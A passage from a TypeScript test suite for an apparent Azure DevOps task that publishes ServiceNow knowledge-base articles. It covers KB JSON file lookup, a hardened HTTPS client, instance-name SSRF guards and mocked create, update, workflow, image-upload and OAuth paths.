                capturedWarnings.some(w => /ArticleInfoSaveFailed|Error saving article information/.test(w)),
                `expected the KB-json save failure to surface via tasks.warning: ${capturedWarnings}`,
            );
        } finally {
            process.chdir(cwd);
        }
    });

    it('findKbArticleJson returns null when no article json is present', () => {
        const cwd = process.cwd();
        process.chdir(tmpDir());
        try {
            assert.strictEqual(manifest.findKbArticleJson(), null);
        } finally {
            process.chdir(cwd);
        }
    });

    it('#449: ignores a non-matching *.json file even if it has an article_id key', () => {
        // findKbArticleJson must only consider filenames matching this task's own
        // legacy-writer convention (KB<number>.json / article_info.json) — not any
        // arbitrary *.json an earlier build step could have dropped in cwd.
        const cwd = process.cwd();
        const dir = tmpDir();
        process.chdir(dir);
        try {
            fs.writeFileSync('rogue.json', JSON.stringify({ article_id: 'rogue-sys-id' }));
            assert.strictEqual(manifest.findKbArticleJson(), null, 'a non-KB-named json file must be ignored');
        } finally {
            process.chdir(cwd);
        }
    });

    it('#449: picks the most recently modified match when multiple KB article json files exist', () => {
        const cwd = process.cwd();
        const dir = tmpDir();
        process.chdir(dir);
        try {
            fs.writeFileSync('KB0001.json', JSON.stringify({ article_id: 'older-sys-id' }));
            const olderTime = new Date(Date.now() - 60_000);
            fs.utimesSync('KB0001.json', olderTime, olderTime);
            fs.writeFileSync('KB0002.json', JSON.stringify({ article_id: 'newer-sys-id' }));
            const found = manifest.findKbArticleJson();
            assert.ok(found);
            assert.strictEqual(found!['article_id'], 'newer-sys-id');
        } finally {
            process.chdir(cwd);
        }
    });
});

// ---------------------------------------------------------------------------
// servicenow-http (the hardened raw-https client that replaced axios)
// ---------------------------------------------------------------------------

describe('servicenow-http.snRequest', () => {
    it('rejects a non-HTTPS URL (refuses to send credentials in cleartext)', async () => {
        await assert.rejects(
            snRequest('GET', 'http://insecure.example.com/api', { headers: { Authorization: 'Bearer x' } }),
            /non-HTTPS/,
        );
    });

    it('rejects an invalid URL', async () => {
        await assert.rejects(snRequest('GET', 'not a url'), /Invalid ServiceNow URL/);
    });

    it('rejects a non-2xx response', async () => {
        nock(BASE_URL).get('/api/now/table/kb_knowledge/missing').reply(404, { error: 'not found' });
        await assert.rejects(
            snRequest('GET', `${BASE_URL}/api/now/table/kb_knowledge/missing`, { headers: HEADERS }),
            /failed with status 404/,
        );
    });

    it('sends query params and parses the JSON result', async () => {
        nock(BASE_URL).get('/api/now/table/kb_category').query({ sysparm_limit: '1' })
            .reply(200, { result: [{ sys_id: 'c1' }] });
        const res = await snRequest('GET', `${BASE_URL}/api/now/table/kb_category`, {
            headers: HEADERS, params: { sysparm_limit: '1' },
        });
        assert.strictEqual(res.status, 200);
        assert.deepStrictEqual(res.data.result, [{ sys_id: 'c1' }]);
    });

    it('sends a form-urlencoded body', async () => {
        nock(BASE_URL).post('/oauth_token.do', 'grant_type=client_credentials')
            .reply(200, { access_token: 'tok' });
        const res = await snRequest('POST', `${BASE_URL}/oauth_token.do`, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'grant_type=client_credentials',
        });
        assert.strictEqual(res.data.access_token, 'tok');
    });

    it('rejects and destroys the request when the response body exceeds the byte cap', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/big')
            .reply(200, 'x'.repeat(11 * 1024 * 1024));
        await assert.rejects(
            snRequest('GET', `${BASE_URL}/api/now/table/kb_knowledge/big`, { headers: HEADERS }),
            /exceeded \d+ bytes/,
        );
    });

    it('rejects when the socket times out (server accepts the connection but never responds)', async function () {
        // nock's mock socket doesn't independently fire req.setTimeout() timers, so
        // this exercises the real Node socket-timeout path against a raw TCP listener
        // that accepts the connection (so the TLS handshake never completes) and never
        // writes anything back. nock patches the http/https modules globally even for
        // allow-listed hosts, which can race with a mid-handshake socket destroy, so
        // fully restore the real modules for the lifetime of this one test.
        nock.restore();
        const server = net.createServer(() => { /* accept and stall */ });
        try {
            await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
            const port = (server.address() as net.AddressInfo).port;
            await assert.rejects(
                snRequest('GET', `https://127.0.0.1:${port}/x`, { headers: HEADERS, timeoutMs: 50 }),
                /timed out after 50ms/,
            );
        } finally {
            server.close();
            nock.activate();
            nock.disableNetConnect();
        }
    });
});

// ---------------------------------------------------------------------------
// index.ts — full-task tests (instance-name SSRF / credential-redirection guard)
// ---------------------------------------------------------------------------

describe('PublishKbArticle full-task: instance SSRF guard', () => {
    before(() => {
        // MockTestRunner shells out to node; point it at the current interpreter.
        (ttm.MockTestRunner.prototype as unknown as { getNodePath: () => string }).getNodePath = function () {
            return process.execPath;
        };
    });

    function runValidations(validator: () => void, tr: ttm.MockTestRunner) {
        try {
            validator();
        } catch (error) {
            console.log('STDERR', tr.stderr);
            console.log('STDOUT', tr.stdout);
            throw error;
        }
    }

    it('InstanceSsrfEmbeddedHostReject — an embedded-host instance value is rejected before any network client runs', async () => {
        const tp = nodePath.join(__dirname, 'InstanceSsrfEmbeddedHostReject.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.failed, 'task should have failed');
            assert.ok(
                tr.errorIssues.some((e) => /Invalid ServiceNow instance|InvalidInstance/.test(e)),
                `error should mention the invalid instance: ${tr.errorIssues}`,
            );
            assert.ok(!/NETWORK_CALLED/.test(tr.stdout + tr.errorIssues.join('\n')), 'no network client should have been invoked');
        }, tr);
    });

    it('InstanceSsrfDotDotReject — a slash/dot-dot instance value is rejected before any network client runs', async () => {
        const tp = nodePath.join(__dirname, 'InstanceSsrfDotDotReject.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.failed, 'task should have failed');
            assert.ok(
                tr.errorIssues.some((e) => /Invalid ServiceNow instance|InvalidInstance/.test(e)),
                `error should mention the invalid instance: ${tr.errorIssues}`,
            );
            assert.ok(!/NETWORK_CALLED/.test(tr.stdout + tr.errorIssues.join('\n')), 'no network client should have been invoked');
        }, tr);
    });

    it('InstanceValidProceeds — a well-formed instance name passes the guard and the task proceeds', async () => {
        const tp = nodePath.join(__dirname, 'InstanceValidProceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.strictEqual(tr.errorIssues.length, 0, `should have no error issues: ${tr.errorIssues}`);
        }, tr);
    });

    it('SourceKeyMissFallsBackToJson — a source-key miss falls through to the KB*.json lookup instead of creating a duplicate', async () => {
        const tp = nodePath.join(__dirname, 'SourceKeyMissFallsBackToJson.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(/json-art-999/.test(tr.stdout), `plan should target the article resolved from JSON fallback: ${tr.stdout}`);
            assert.ok(!/CREATE new article/.test(tr.stdout), `a source-key miss must not plan a create when a KB*.json exists: ${tr.stdout}`);
        }, tr);
    });
});

// ===========================================================================
// PublishKbArticle full-task: real (non-dry-run) execution paths
//
// Every scenario above hardcodes dryRun=true (or reaches an early return
// before dryRun is even checked). executeCreateOrUpdate()'s real POST/PATCH
// branches, the image-upload phase, kbId='list' mode, and the
// serviceConnection-derived OAuth wiring in resolveAuth() were therefore
// never exercised by any test -- a regression in any of them would be caught
// by neither a test nor the coverage gate (#25/#36).
// ===========================================================================
describe('PublishKbArticle full-task: real (non-dry-run) execution paths', () => {
    before(() => {
        (ttm.MockTestRunner.prototype as unknown as { getNodePath: () => string }).getNodePath = function () {
            return process.execPath;
        };
    });

    function runValidations(validator: () => void, tr: ttm.MockTestRunner) {
        try {
            validator();
        } catch (error) {
            console.log('STDERR', tr.stderr);
            console.log('STDOUT', tr.stdout);
            throw error;
        }
    }

    it('RealCreateSucceeds — dryRun=false with no articleId performs a real create', async () => {
        const tp = nodePath.join(__dirname, 'RealCreateSucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(
                tr.stdout.includes('##[MOCK] createKnowledgeArticle called with instance=my-valid-instance kbId=kb-123 title=Brand New Article author=jdoe'),
                `createKnowledgeArticle should receive the task inputs correctly threaded through: ${tr.stdout}`,
            );
            assert.ok(
                tr.stdout.includes('##vso[task.setvariable variable=kbArticleId;isOutput=true;issecret=false;]new-sys-id'),
                `kbArticleId output variable should be set from the created article: ${tr.stdout}`,
            );
            assert.ok(/Article Number: KB0099|ArticleNumberLine KB0099/.test(tr.stdout), `should log the created article number: ${tr.stdout}`);
        }, tr);
    });

    it('RealUpdateSucceeds — dryRun=false with an existing articleId + content performs a real update', async () => {
        const tp = nodePath.join(__dirname, 'RealUpdateSucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(
                tr.stdout.includes('##[MOCK] updateKnowledgeArticle called with instance=my-valid-instance articleId=existing-art-id title=Updated Title'),
                `updateKnowledgeArticle should receive the task inputs correctly threaded through: ${tr.stdout}`,
            );
            assert.ok(
                tr.stdout.includes('##vso[task.setvariable variable=kbArticleId;isOutput=true;issecret=false;]existing-art-id'),
                `kbArticleId output variable should be set from the updated article: ${tr.stdout}`,
            );
            assert.ok(/Article Number: KB0050|ArticleNumberLine KB0050/.test(tr.stdout), `should log the updated article number: ${tr.stdout}`);
        }, tr);
    });

    it('RealWorkflowOnlySucceeds — dryRun=false with only workflowState performs a real workflow-state change', async () => {
        const tp = nodePath.join(__dirname, 'RealWorkflowOnlySucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(
                tr.stdout.includes('##vso[task.setvariable variable=kbWorkflowState;isOutput=true;issecret=false;]published'),
                `kbWorkflowState output variable should reflect the new state: ${tr.stdout}`,
            );
            assert.ok(/Changing workflow state to 'publish'|ChangingWorkflowState publish/.test(tr.stdout), `should log the workflow-only path was taken: ${tr.stdout}`);
        }, tr);
    });

    it('RealUploadImagesSucceeds — uploadImages=true runs the image-upload phase and rewrites the body', async () => {
        const tp = nodePath.join(__dirname, 'RealUploadImagesSucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(/Rewrote 1 image reference\(s\) to ServiceNow attachments|ImagesRewritten 1/.test(tr.stdout), `should log the image-upload result: ${tr.stdout}`);
            assert.ok(tr.stdout.includes('##[MOCK] updateArticleBody called with text:'), `updateArticleBody should have been called with the rewritten body: ${tr.stdout}`);
        }, tr);
    });

    it('RealListKbSucceeds — kbId=list lists knowledge bases and returns before any create/update logic', async () => {
        const tp = nodePath.join(__dirname, 'RealListKbSucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(tr.stdout.includes('IT Knowledge Base'), `should list the mocked knowledge base: ${tr.stdout}`);
            assert.ok(tr.stdout.includes('kb-sys-1'), `should include the KB sys_id: ${tr.stdout}`);
        }, tr);
    });

    it('RealServiceConnectionOAuthSucceeds — auth resolved via serviceConnection (OAuth scheme) instead of inline inputs', async () => {
        const tp = nodePath.join(__dirname, 'RealServiceConnectionOAuthSucceeds.js');
        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
        await tr.runAsync();
        runValidations(() => {
            assert.ok(tr.succeeded, 'task should have succeeded');
            assert.ok(
                tr.stdout.includes('##[MOCK] getOAuthToken called with instance=sc-instance clientId=sc-client-id clientSecret=sc-client-secret'),
                `resolveAuth should have derived instance/clientId/clientSecret from the service connection endpoint: ${tr.stdout}`,
            );
        }, tr);
    });
});
